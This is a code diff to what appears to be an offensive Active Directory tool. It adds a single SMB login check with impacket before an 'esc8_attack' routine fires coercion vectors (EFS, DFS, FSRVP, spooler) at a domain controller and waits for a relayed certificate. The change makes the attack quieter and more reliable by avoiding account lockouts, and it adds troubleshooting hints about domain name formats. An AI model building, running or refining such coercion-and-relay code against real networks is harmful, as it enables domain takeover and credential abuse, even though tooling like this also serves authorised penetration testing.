@@ -2104,6 +2104,23 @@ def _default_src_ip(target_hint=None):
     return None
 
 
+def _auth_check(dc, domain, username, password, lmhash, nthash, timeout):
+    """One SMB login against the DC to confirm the creds work BEFORE firing a
+    sweep of coercion binds. A bad credential fired many times can lock the
+    account out, so this gate runs exactly one logon. Returns (ok, reason)."""
+    try:
+        from impacket.smbconnection import SMBConnection
+        conn = SMBConnection(dc, dc, timeout=timeout)
+        conn.login(username, password, domain, lmhash or '', nthash or '')
+        try:
+            conn.logoff()
+        except Exception:
+            pass
+        return True, ''
+    except Exception as e:
+        return False, str(e).split('\n')[0][:90]
+
+
 def _fire_all_coercions(dc, domain, username, password, hashes, listener_ip,
                         timeout):
     """Fire every known coercion vector (EFS, DFS, FSRVP, spooler) at the DC
@@ -2192,13 +2209,27 @@ def esc8_attack(dc, ca, template, domain, username, password, lmhash, nthash,
         return None
     time.sleep(1.0)
 
+    # Gate: one logon to confirm the creds before a sweep of binds, so a bad
+    # credential cannot hammer the account into a lockout.
+    ok, why = _auth_check(dc, domain, username, password, lmhash, nthash, timeout)
+    if not ok:
+        print(c('[-] SMB auth to %s failed: %s' % (dc, why), C.BRED))
+        if 'LOGON_FAILURE' in why or 'STATUS_LOGON_FAILURE' in why:
+            print(c('    The creds were rejected. Over SMB, NTLM wants the short '
+                    'NetBIOS domain, so try CORP/abacode rather than the FQDN '
+                    'corp.domain.com/abacode, and re-check the password.',
+                    C.YELLOW))
+        print(c('    Not firing coercion, to avoid locking the account out.',
+                C.YELLOW))
+        return None
+
     hashes = ('%s:%s' % (lmhash, nthash)) if nthash else None
     print(c('[*] firing coercion vectors at %s (callback -> %s)...'
             % (dc, listener_ip), C.CYAN))
     if not _fire_all_coercions(dc, domain, username, password, hashes,
                                listener_ip, timeout):
         print(c('[-] no coercion vector fired; see the per-vector reasons above '
-                '(creds, pipe presence, or firewall).', C.YELLOW))
+                '(pipe presence, privileges, or firewall).', C.YELLOW))
 
     print(c('[*] waiting up to %ds for the certificate to be issued...' % wait,
             C.CYAN))
